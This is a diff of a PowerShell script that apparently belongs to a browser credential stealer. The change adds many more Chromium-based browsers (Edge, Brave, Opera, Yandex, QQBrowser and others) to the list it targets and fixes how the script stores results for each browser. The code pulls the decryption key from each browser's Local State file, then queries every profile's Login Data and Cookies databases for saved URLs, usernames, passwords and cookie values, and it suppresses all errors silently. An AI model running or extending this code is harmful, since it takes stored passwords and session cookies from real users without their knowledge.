@@ -725,20 +725,31 @@ function Read-ChromiumLocalState {
 $data = [ordered]@{}
 
 # Chromium
-# "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
-$chrome = @("Chrome", "Chrome Dev", "Chrome Beta", "Chrome Canary")
+# https://chromium.googlesource.com/chromium/src/+/HEAD/docs/user_data_dir.md
+$chrome = @("Chrome", "Chrome Beta", "Chrome SxS")
 $chromiumPaths = @()
 foreach($_item in $chrome) {
     $chromiumPaths += "$env:LocalAppData\Google\$_item"
 }
+
+# Untested
+$chromiumPaths += "$env:LocalAppData\Chromium"
+$chromiumPaths += "$env:AppData\Opera Software\Opera Stable"
+$chromiumPaths += "$env:AppData\Opera Software\Opera GX Stable"
+$chromiumPaths += "$env:LocalAppData\Microsoft\Edge"
+$chromiumPaths += "$env:LocalAppData\CocCoc\Browser"
+$chromiumPaths += "$env:LocalAppData\BraveSoftware\Brave-Browser"
+$chromiumPaths += "$env:LocalAppData\Yandex\YandexBrowser"
+$chromiumPaths += "$env:LocalAppData\Tencent\QQBrowser"
+
 foreach ($chromiumPath in $chromiumPaths) {
     if ( -not (Test-Path -Path "$chromiumPath") ) {
         continue
     }
-    $data[$_item] = @{}
+    $data[$chromiumPath] = @{}
     try{
         # Read local state data
-        $data[$_item]['decrypted_key'] = Read-ChromiumLocalState -path "$chromiumPath\User Data\Local State"
+        $data[$chromiumPath]['decrypted_key'] = Read-ChromiumLocalState -path "$chromiumPath\User Data\Local State"
     }catch{}
 
     # Read dir
@@ -748,14 +759,14 @@ foreach ($chromiumPath in $chromiumPaths) {
         if (-not ($folder -eq "default" -or $folder.StartsWith("profile "))) {
             continue
         }
-        $data[$_item][$_folder] = [ordered]@{}
+        $data[$chromiumPath][$_folder] = [ordered]@{}
         try {
             # Read logins data
-            $data[$_item][$_folder]['logins'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Login Data" -query 'select origin_url,username_value,hex(password_value) from logins'
+            $data[$chromiumPath][$_folder]['logins'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Login Data" -query 'select origin_url,username_value,hex(password_value) from logins'
         }catch{}
         try {
             # Read cookies data
-            $data[$_item][$_folder]['cookies'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Cookies" -query 'select host_key,name,hex(encrypted_value) from cookies'
+            $data[$chromiumPath][$_folder]['cookies'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Cookies" -query 'select host_key,name,hex(encrypted_value) from cookies'
         }catch{}
     }
 
